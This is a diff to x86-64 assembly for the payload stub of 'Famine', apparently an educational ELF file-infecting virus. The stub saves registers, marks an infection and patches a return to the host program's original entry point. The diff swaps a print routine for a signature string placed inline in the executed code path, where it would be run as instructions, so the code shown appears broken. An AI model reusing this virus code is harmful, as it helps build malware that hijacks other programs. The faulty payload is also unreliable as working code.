@@ -1,12 +1,6 @@
 BITS 64
 
-SECTION .data
-        famine_msg: db "....famine....",10
-        famine_msg_len  : equ $-famine_msg
-
 SECTION .text
-%define WRITE 1
-%define STDOUT 1
 
 _start_payload:
     push rax                 ; save all clobbered registers
@@ -17,7 +11,7 @@ _start_payload:
     push r11
 
 _infection:
-    call _print_famine
+    famine_mark: db "Famine version 1.0 (c)oded by mabouce",10
 
 _end_payload:
     pop r11
@@ -40,12 +34,4 @@ _ret2oep:
     sub rax, 0x77777777 ; virus size without ret2oep
     sub rax, 0x77777777 ; new_entry_point
     add rax, 0x77777777 ; old entry_point
-    ret
-
-_print_famine:
-    mov rax, WRITE                ; sys_write
-    mov rdi, STDOUT                ; stdout
-    mov rdx,famine_msg_len;len
-    lea rsi,[rel $+famine_msg-$]  ; famine
-    syscall
     ret
